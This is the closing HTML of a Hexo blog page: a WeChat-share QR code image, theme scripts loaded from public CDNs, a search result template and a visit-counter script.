    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKUlEQVR42u3aS3LCQAxFUfa/aTJhGJv7pDZVrb4epQLYfRgI/V4vfL3Bdf/++3te/WfxJUOGjG0Z5HD3x02fQp7OzyZDhoxzGFcPvnrP1avkKyAH5WeTIUOGDH5ojuGJpgwZMmR0GJ3Aev8UGTJkyOgUsbzHVWvY/agWlyFDxoYM3iz7/d+PzDdkyJCxFeOJwpIHzf55PveRIUPGaAYPcP01i/Sz8UBUhgwZoxlp84sEYl5wkkFpMVmUIUPGIAZPAXlil96hVuj+87shQ4aMoYxaeOXBupPqBSNMGTJkjGbwD5Mwytv9JHzzDFCGDBlTGWkhyg+aJpH8CwrSQRkyZIxg8LZX3JrHR+FDAvTDIEOGjHGMWnjthMva4tcXvAwZMkYzasPLNCx25oyoCpchQ8ZoRtqZq61i1AaWvP0nQ4aM0xjpIsXTVHRnGTJkHMBYVaySFhsJvumihgwZMk5grMq40nliZ9lChgwZ5zDSBI6XoOkXxNt88eaIDBkyxjFIQlZr7vfL3S9flgwZMo5h8AQxDY6krVY7gwwZMs5hkPIyDamdYL1skClDhozNGe/w6ofjtcNRGTJknMDgV+2mJBzXlsaCAacMGTJGMEiQ5atdvMXWCbhxgihDhowRjNqqRFqCpqknL4NlyJAho78ekRa66RqZDBkyZKTtNvJqLVgHI0wZMmSMY/BylDfOaoG7BpMhQ8ZsBi8d48KydAiyQFYcZMqQIWM/xh9fAWC+aBYyNAAAAABJRU5ErkJggg==" alt="å¾®ä¿¡åˆ†äº«äºŒç»´ç ">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
